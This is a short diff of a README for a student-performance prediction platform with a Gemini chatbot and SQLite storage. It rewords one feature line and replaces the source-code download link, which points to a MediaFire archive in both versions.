@@ -8,7 +8,7 @@ Developed an AI-powered educational analytics platform capable of predicting stu
 
 ## Key Features
 
-AI chatbot powered by Gemini model
+AI chatbot powered by the Gemini model
 
 Student academic performance prediction
 
@@ -20,4 +20,4 @@ SQLite database integration
 
 ## Source Code
 
-https://www.mediafire.com/file/cf3luzu10uqerwf/education_prediction_project.zip/file
+https://www.mediafire.com/file/pe92hxmw1uohlvk/Big+Data-EduPredict.rar/file
